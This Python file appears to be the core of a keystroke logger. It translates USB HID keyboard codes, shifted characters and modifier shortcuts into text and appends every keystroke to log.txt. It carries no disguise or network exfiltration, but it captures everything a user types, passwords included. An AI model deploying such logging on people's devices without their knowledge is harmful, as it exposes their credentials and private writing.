# Normal keymap (without shift)
key_map = {
    # Letters
    4: "a", 5: "b", 6: "c", 7: "d", 8: "e", 9: "f", 10: "g",
    11: "h", 12: "i", 13: "j", 14: "k", 15: "l", 16: "m",
    17: "n", 18: "o", 19: "p", 20: "q", 21: "r", 22: "s",
    23: "t", 24: "u", 25: "v", 26: "w", 27: "x", 28: "y", 29: "z",
    # Numbers (top row)
    30: "1", 31: "2", 32: "3", 33: "4", 34: "5",
    35: "6", 36: "7", 37: "8", 38: "9", 39: "0",
    # Controls
    40: "[ENTER]",
    41: "[ESC]",
    42: "[BKSP]",
    43: "[TAB]",
    44: " ",
    # Symbols
    45: "-", 46: "=", 47: "[", 48: "]", 49: "\\",
    50: "#", 51: ";", 52: "'", 53: "`",
    54: ",", 55: ".", 56: "/",
    # Locks / function
    57: "[CAPS]",
    58: "[F1]", 59: "[F2]", 60: "[F3]", 61: "[F4]",
    62: "[F5]", 63: "[F6]", 64: "[F7]", 65: "[F8]",
    66: "[F9]", 67: "[F10]", 68: "[F11]", 69: "[F12]",
    70: "[PRTSC]",
    71: "[SCRLK]",
    72: "[PAUSE]",
    # Navigation
    73: "[INS]",
    74: "[HOME]",
    75: "[PGUP]",
    76: "[DEL]",
    77: "[END]",
    78: "[PGDN]",
    # Arrows
    79: "[RIGHT]",
    80: "[LEFT]",
    81: "[DOWN]",
    82: "[UP]",
    # Numpad
    83: "[NUMLK]",
    84: "[NUM/]",
    85: "[NUM*]",
    86: "[NUM-]",
    87: "[NUM+]",
    88: "[NUM_ENTER]",
    89: "[NUM1]", 90: "[NUM2]", 91: "[NUM3]", 92: "[NUM4]", 93: "[NUM5]",
    94: "[NUM6]", 95: "[NUM7]", 96: "[NUM8]", 97: "[NUM9]", 98: "[NUM0]",
    # Modifiers (grouped)
    -0x01: "CTRL",
    -0x02: "SHIFT",
    -0x04: "ALT",
    -0x08: "WIN",
    -0x10: "CTRL",
    -0x20: "SHIFT",
    -0x40: "ALT",
    -0x80: "WIN",
}

# Shifted keymap
key_map_shift = {
    # Letters - uppercase
    4: "A", 5: "B", 6: "C", 7: "D", 8: "E", 9: "F", 10: "G",
    11: "H", 12: "I", 13: "J", 14: "K", 15: "L", 16: "M",
    17: "N", 18: "O", 19: "P", 20: "Q", 21: "R", 22: "S",
    23: "T", 24: "U", 25: "V", 26: "W", 27: "X", 28: "Y", 29: "Z",
    # Numbers (top row) - shifted symbols
    30: "!", 31: "@", 32: "#", 33: "$", 34: "%",
    35: "^", 36: "&", 37: "*", 38: "(", 39: ")",
    # Controls (same as normal)
    40: "[ENTER]",
    41: "[ESC]",
    42: "[BKSP]",
    43: "[TAB]",
    44: " ",
    # Symbols - shifted
    45: "_", 46: "+", 47: "{", 48: "}", 49: "|",
    50: "~", 51: ":", 52: '"', 53: "~",
    54: "<", 55: ">", 56: "?",
    # Locks / function (same as normal)
    57: "[CAPS]",
    58: "[F1]", 59: "[F2]", 60: "[F3]", 61: "[F4]",
    62: "[F5]", 63: "[F6]", 64: "[F7]", 65: "[F8]",
    66: "[F9]", 67: "[F10]", 68: "[F11]", 69: "[F12]",
    70: "[PRTSC]",
    71: "[SCRLK]",
    72: "[PAUSE]",
    # Navigation (same as normal)
    73: "[INS]",
    74: "[HOME]",
    75: "[PGUP]",
    76: "[DEL]",
    77: "[END]",
    78: "[PGDN]",
    # Arrows (same as normal)
    79: "[RIGHT]",
    80: "[LEFT]",
    81: "[DOWN]",
    82: "[UP]",
    # Numpad (same as normal)
    83: "[NUMLK]",
    84: "[NUM/]",
    85: "[NUM*]",
    86: "[NUM-]",
    87: "[NUM+]",
    88: "[NUM_ENTER]",
    89: "[NUM1]", 90: "[NUM2]", 91: "[NUM3]", 92: "[NUM4]", 93: "[NUM5]",
    94: "[NUM6]", 95: "[NUM7]", 96: "[NUM8]", 97: "[NUM9]", 98: "[NUM0]",
    # Modifiers (same as normal)
    -0x01: "CTRL",
    -0x02: "SHIFT",
    -0x04: "ALT",
    -0x08: "WIN",
    -0x10: "CTRL",
    -0x20: "SHIFT",
    -0x40: "ALT",
    -0x80: "WIN",
}

# Letter keys that can be uppercased
LETTER_KEYS = set(range(4, 30))  # a-z

class ModKeys:
    def __init__(self, mod_keys):
        self.shift = False
        self.alt = False
        self.ctrl = False
        self.win = False
        self.any = False
        self._init_mods(mod_keys)
    
    def _init_mods(self, mod_keys):
        for code in mod_keys:
            if code == -0x01 or code == -0x10:  # left_ctrl or right_ctrl
                self.ctrl = True
            elif code == -0x02 or code == -0x20:  # left_shift or right_shift
                self.shift = True
            elif code == -0x04 or code == -0x40:  # left_alt or right_alt
                self.alt = True
            elif code == -0x08 or code == -0x80:  # left_ui or right_ui
                self.win = True

class Log:
    def __init__(self, size, key_lock):
        self.path = "log.txt"
        self.size = size
        self.buffer = []
        self.last_state = set()
        self.lock = key_lock
    
    def _get_press(self, modifiers, keys):
        if not keys:
            return ""
        mod = ModKeys(modifiers)
        newly_pressed_keys = set(keys) - self.last_state
        self.last_state = set(keys)
        
        # No new keys pressed
        if not newly_pressed_keys:
            return ""
        
        # Shortcut detected
        if mod.ctrl or mod.alt or mod.win:
            self.last_state.clear()
            parts = []
            # Add all currently held modifiers
            for code in modifiers:
                parts.append(key_map.get(code, "?"))
            for code in newly_pressed_keys:
                # Use shift map for letters if shift is held, otherwise normal map
                if mod.shift and code in LETTER_KEYS:
                    parts.append(key_map_shift.get(code, "?"))
                else:
                    parts.append(key_map.get(code, "?"))
            return "[" + "+".join(parts) + "]"

        # Regular typing with shift/caps logic
        if mod.shift and self.lock.caps_lock:
            # Both shift and caps lock - nullify each other (use normal map)
            return "".join([key_map.get(key, "?") for key in newly_pressed_keys])
        elif not mod.shift and not self.lock.caps_lock:
            # Neither shift nor caps lock (use normal map)
            return "".join([key_map.get(key, "?") for key in newly_pressed_keys])
        else:
            # Either shift or caps lock (use shift map)
            return "".join([key_map_shift.get(key, "?") for key in newly_pressed_keys])

    def _flush(self):
        if not self.buffer:
            return
        string = "".join(self.buffer)
        file = open(self.path, "a")
        file.write(string)
        file.close()

    def add(self, modifiers, keys):
        # Flush when buffer reaches size limit
        if len(self.buffer) >= self.size:
            self._flush()
        # Then write to file
        press_str = self._get_press(modifiers, keys)
        if press_str:
            self.buffer.append(press_str)
